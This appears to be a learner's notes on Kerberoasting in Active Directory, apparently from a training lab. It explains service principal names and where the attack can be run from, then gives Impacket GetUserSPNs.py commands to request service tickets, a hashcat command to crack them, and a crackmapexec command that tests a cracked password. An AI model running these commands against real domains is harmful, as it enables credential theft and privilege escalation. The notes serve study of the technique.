## Overview
Lateral movement/ PrivEsc technique used in AD.
Targets [Service Principal names](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names). 
	Unique Identifiers that Kerberos uses to map a service instance to a service account. 
	Domain accounts of used to overcome network limitations. 
	Any account can request any Kerberos ticket.
Need a password or NTLM hash, shell in a domain user or a SYSTEM level access on a domain joined host.
Service accounts often added to privileged groups such as domain admins. 
Service accounts often give week/ reused passwords to simplify administration. 

### How the Attack Works 
#### Where
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.
#### With 
- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.
## From Linux
#### GetUsersSPNs
##### Getting a Ticket
List Service Accounts
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
Requesting all TGS tickets
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```
Requesting a Single Ticket
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
##### Saving a Ticket 
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
##### Crack the Ticket 
```shell
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```
##### Test the Authentication 
```shell
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
##### Can list what groups the user is in with 
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user>
```
Group is after the CN= 